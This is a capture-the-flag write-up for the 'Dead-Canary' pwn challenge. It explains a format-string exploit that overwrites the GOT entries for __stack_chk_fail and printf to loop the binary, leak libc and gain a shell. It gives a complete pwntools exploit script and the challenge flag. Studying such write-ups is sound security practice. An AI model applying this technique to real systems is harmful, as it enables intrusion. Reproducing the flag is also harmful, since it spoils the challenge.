# Dead-Canary
Pwn, 475

> It is a terrible crime to slay a canary. Killing a canary will keep your exploit alive even if you are an inch from segfaults. But at a terrible price.
> 
> nc 2020.redpwnc.tf 31744

From the given Dockerfile, it's running on Ubuntu 18.04, which uses `libc.2-27.so`.

`pwn checksec dead-canary` gives:
```
[*] '/home/boshua/deadcanary/bin/dead-canary'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

Stack canary means that there is no bof (or does it?).

Also, no source is given, so I dumped it into Ghidra.

Right away, there is a pretty clear fstring vulnerability:

![](https://i.imgur.com/Jjp0a7X.png)

My first idea was to use the format string to leak the stack canary, but that won't work because the binary will just exit.

I got the binary to loop by overwriting `__stack_chk_fail` with the main address, and thne overwriting the canary, which would trigger `__stack_chk_fail`.

On the first iteration, I used the fstring vulnerability to overwrite the address of `__stack_chk_fail` in the Global Offset Table. I then appended a bunch of `A`s to overwrite the canary. Then, I also leaked a libc pointer in the same printf.

On the second iteration, I overwrote the address of `printf` in the GOT with `system`.

On the third iteration, I got a shell and the flag.

Note: I only write part of `system` to libc (lazy). So, the script occasionally will not work. In that case I just ran it again until it did.

```python
from pwn import *

p = remote("2020.redpwnc.tf", 31744)
#p = process("bin/dead-canary")
e = ELF("bin/dead-canary")
LIBC = ELF("./libc-2.27.so")
"""
gdb.attach(p,
'''break *0x40074b
#break *0x400799
break *0x4007ea
break *0x4007fc''')
"""
MAIN_ADDR = 0x400737
STACK_CHK_FAIL_GOT = e.got["__stack_chk_fail"]
PRINTF_GOT = e.got["printf"]

# address of our input starts at %6$lx
# address of the canary is at %39$lx
# address of the libc pointer is at %41$lx
# libc offset is 0x21b97

print("stack chk fail: ", hex(STACK_CHK_FAIL_GOT))
print("printf got: ", hex(PRINTF_GOT))
print("main func addr: ", hex(MAIN_ADDR))

exploit = ""

exploit += "%{}p%16$hn%{}p%17$hn %41$lx".format(0x40, 0x737-0x40)

exploit = exploit.ljust(80)
exploit += p64(STACK_CHK_FAIL_GOT+2)
exploit += p64(STACK_CHK_FAIL_GOT)
exploit += "A"*180

p.recvuntil(": ")
p.sendline(exploit)

#p.interactive()

x = p.recvuntil(": ").split()

libc_pointer = int(x[-5], 16)

LIBC.address = libc_pointer-0x21b97

print("libc base: ", hex(LIBC.address))

LIBC_SYSTEM = LIBC.sym["system"]

print("libc system: ", hex(LIBC_SYSTEM))

thing = list(hex(LIBC_SYSTEM)[2:])
lo = int(''.join([thing.pop() for i in range(4)][::-1]), 16)
mid = int(''.join([thing.pop() for i in range(4)][::-1]), 16)
hi = int(''.join(thing), 16)

print("hi: ", hex(hi))
print("mid: ", hex(mid))
print("lo: ", hex(lo))

print("lo-mid: ", lo-mid)

exploit = ""
exploit += "%{}p%16$hn%{}p%17$hn".format(mid, lo-mid)
exploit = exploit.ljust(80)
exploit += p64(PRINTF_GOT+2)
exploit += p64(PRINTF_GOT)
exploit += "A"*180

p.sendline(exploit)

p.interactive()
```

Flag: `flag{t0_k1ll_a_canary_4e47da34}`